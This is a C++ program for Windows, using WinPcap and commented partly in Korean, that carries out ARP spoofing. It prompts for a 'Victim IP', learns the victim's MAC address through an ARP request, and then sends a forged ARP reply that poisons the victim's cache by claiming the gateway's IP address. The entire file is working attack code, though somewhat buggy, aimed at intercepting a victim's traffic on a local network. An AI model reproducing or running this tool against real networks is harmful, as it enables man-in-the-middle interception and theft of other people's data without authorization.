
#include <iostream>
#include <stdio.h>
#include <string.h>
#include <stdlib.h> /* for exit() */
#include <time.h>
#include <pcap.h>
#include <IPHlpApi.h>
#include <process.h>

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "wpcap.lib")
#define HAVE_STRUCT_TIMESPEC
#define ETHERNET_ARP "\x08\x06"

using namespace std;

struct ethhdr
{
	unsigned char dstMAC[6];	//destination mac
	unsigned char srcMAC[6];	//source ip
	unsigned char type[2];		//next protocol type
};
// ARP Header Struktur
struct arphdr
{
	unsigned char htype[2];				// hardware type
	unsigned char ptype[2];				// protocol type
	unsigned char hlen[1];					// hardware address length
	unsigned char plen[1];					// protocol address length
	unsigned char opcode[2];				// arp opcode
	unsigned char srcMAC[6];	// source mac
	unsigned char srcIP[4];		// source ip
	unsigned char dstMAC[6];	// destination mac
	unsigned char dstIP[4];		// destination ip
};
ethhdr eth;
arphdr arp;

void ARPSpoofing(unsigned char *Gateway) {
	pcap_if_t *alldevs;
	pcap_t *pd;
	pcap_if_t *d;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[1000];
	int i = 0;


	/* Retrieve the device list on the local machine */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d->next; d = d->next, i++);

	if (i == 0 && d == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return;
	}


	//pcap_freealldevs(alldevs);


	/* Jump to the selected adapter */

	/* Open the adapter */
	if ((pd = pcap_open_live(
		d->name,      // name of the device
		65536,         // portion of the packet to capture. It doesn't matter in this case 
		0,            // promiscuous mode (nonzero means promiscuous)
		1000,         // read timeout
		errbuf         // error buffer
	)) == NULL)
	{
		//      fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		return;
	}
	memcpy(arp.srcIP, Gateway, 4);
	memcpy(arp.opcode, "\x00\x02", 2);
	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	// 패킷 전송
	if (pcap_sendpacket(pd, packet, sizeof(eth) + sizeof(arp)) != 0)
	{
		fprintf(stderr, "\n %s Error sending the packet: \n", pcap_geterr(pd));
		exit(1);
	}
}

void Packet_Check(unsigned char *user, const struct pcap_pkthdr *h, const unsigned char *p)
{	
	p += 12; //dst,src MAC
	if (*((unsigned short*)p) == 0x608)
	{
		p += 2; //type
		p += 6; //opcode
		if (*((unsigned short*)p) == 0x200)
		{
			p += 2;
			p += 6; //srcIP
			if (strncmp((char*)((unsigned int*)p), (char*)arp.dstIP,4) == 0)
			{
				p += 4;
				p += 6;
				if (strncmp((char*)((unsigned int*)p), (char*)arp.srcIP, 4) == 0)
				{
					printf("Capture!\n");
					p -= 16;
					memcpy(arp.dstMAC, p, 6);
					memcpy(eth.dstMAC, p, 6);
				}
			}
				
		}
	}

}

unsigned __stdcall RecvPacket(void *pd)
{
	//패킷수신
	if (pcap_loop((pcap_t*)pd, -1, Packet_Check, 0) < 0)
	{
		//perror(pcap_geterr((pcap_t*)pd));
		//exit(1);
		return 0;
	}
}

void GetDstMAC(unsigned char *srcIP, unsigned char *srcMAC, unsigned char *dstIP, unsigned char *dstMAC, unsigned char * gatewayC)
{
	pcap_if_t *alldevs;
	pcap_t *pd;
	pcap_if_t *d;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_char packet[1000];
	int i = 0;


	/* Retrieve the device list on the local machine */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d->next; d = d->next, i++);

	if (i == 0 && d == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return;
	}


	//pcap_freealldevs(alldevs);


	/* Jump to the selected adapter */

	/* Open the adapter */
	if ((pd = pcap_open_live(
		d->name,      // name of the device
		65536,         // portion of the packet to capture. It doesn't matter in this case 
		0,            // promiscuous mode (nonzero means promiscuous)
		1000,         // read timeout
		errbuf         // error buffer
	)) == NULL)
	{
		//      fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		return;
	}

	//setting ehternet header
	memcpy(eth.dstMAC, "\xff\xff\xff\xff\xff\xff", 6);
	memcpy(eth.srcMAC, srcMAC, 6);
	memcpy(eth.type, "\x08\x06", 2);

	//setting ethernet header
	memcpy(arp.htype, "\x00\x01", 2);
	memcpy(arp.ptype, "\x08\x00", 2);
	memcpy(arp.hlen, "\x06", 1);
	memcpy(arp.plen, "\x04", 1);
	
	memcpy(arp.opcode, "\x00\x01", 2);
	memcpy(arp.srcMAC, srcMAC, 6);
	memcpy(arp.srcIP, srcIP, 4);
	memcpy(arp.dstMAC, "\x00", 6);
	
	memcpy(arp.dstIP, dstIP, 4);

	memcpy(packet, &eth, sizeof(eth));
	memcpy(packet + sizeof(eth), &arp, sizeof(arp));

	
	HANDLE th = (HANDLE)_beginthreadex(NULL, 0, &RecvPacket, pd, NULL, 0);
	Sleep(1000);
	// 패킷 전송
	if (pcap_sendpacket(pd, packet, sizeof(eth)+sizeof(arp)) != 0)
	{
		fprintf(stderr, "\n %s Error sending the packet: \n", pcap_geterr(pd));
		exit(1);
	}
	WaitForSingleObject(th, 1000);
	pcap_close(pd);


}
void GetAdapterInfo(unsigned char* srcIP, unsigned char* srcMAC, unsigned char* dstIP, unsigned char* Gateway)
{
	DWORD dwStatus;
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG ulBuffer = 0;

	//네트워크 정보 얻기
	dwStatus = GetAdaptersInfo(pAdapterInfo, &ulBuffer);

	//네트워크 정보가 배열에 오버플로우를 일으킨다면 동적할당 후 다시 받기
	if (dwStatus == ERROR_BUFFER_OVERFLOW)
	{
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulBuffer);
		dwStatus = GetAdaptersInfo(pAdapterInfo, &ulBuffer);
		if (pAdapterInfo == NULL)
			printf("Error!");
	}

	//srcMAC 주소 얻기
	memcpy(srcMAC, pAdapterInfo->Address, sizeof(pAdapterInfo->Address));

	//gateway 주소 얻기 (gateway를 4등분함)
	char *ptr = 0;
	ptr = strtok(pAdapterInfo->GatewayList.IpAddress.String, ".");
	int i = 0;
	while (i<4) {
		Gateway[i++] = atoi(ptr);
		ptr = strtok(NULL, ".");
	}

	//srcIP 주소 얻기(IP를 4등분함)
	ptr = 0;
	ptr = strtok(pAdapterInfo->IpAddressList.IpAddress.String, ".");
	i = 0;
	while (i<4) {
		srcIP[i++] = atoi(ptr);
		ptr = strtok(NULL, ".");
	}

	//dstIP 주소 얻기(IP를 4등분함)
	ptr = 0;
	unsigned char dip[20];
	memcpy(dip, dstIP, 15);
	ptr = strtok((char*)dip, ".");
	i = 0;
	while (i<4) {
		dstIP[i++] = atoi(ptr);
		ptr = strtok(NULL, ".");
	}
}
int main(int argc, char **argv)
{
	unsigned char srcIP[16];
	unsigned char srcMAC[24];
	unsigned char gateway[16];
	unsigned char dstMAC[24];
	unsigned char dstIP[16];

	printf("Victim IP : ");
	scanf_s("%s", dstIP, sizeof(dstIP));
	memset(srcIP, 0, sizeof(srcIP));
	memset(srcMAC, 0, sizeof(srcMAC));
	memset(gateway, 0, sizeof(gateway));

	
	GetAdapterInfo(srcIP, srcMAC, dstIP, gateway);

	GetDstMAC(srcIP, srcMAC, dstIP, dstMAC, gateway);
	//printf("ddd");
	ARPSpoofing(gateway);
	return 0;
}
